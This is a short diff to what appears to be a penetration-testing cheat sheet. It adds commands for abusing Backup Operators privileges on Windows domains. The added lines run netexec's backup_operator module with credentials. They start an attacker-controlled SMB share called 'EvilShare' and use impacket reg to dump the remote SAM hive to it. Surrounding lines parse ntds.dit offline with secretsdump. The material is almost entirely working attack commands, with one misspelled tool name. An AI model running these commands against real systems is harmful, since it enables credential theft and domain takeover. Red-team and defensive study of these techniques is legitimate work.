@@ -112,6 +112,17 @@ reg save HKLM\SYSTEM C:\Temp\SYSTEM
 ```
 
 ```bash
+# 
+nxc smb $DOMAIN -u '$USER' -p '$PASS' -m backup_operator
+nxc smb $DOMAIN -u '$USER' -p '$PASS' -m backup_operator --local-auth 
+
+# Bypass with reg 
+# Terminal 1
+impacket-smbserver -smb2support "EvilShare" . 
+
+# Terminal 2 
+impaket-reg '$USER':'$PASS'@$RHOST_IP save -keyName 'HKLM\SAM' -o '\\LHOST\EvilShare'
+
 # Parse offline
 impacket-secretsdump -ntds C:\Temp\ntds.dit -system C:\Temp\SYSTEM LOCAL
 ```
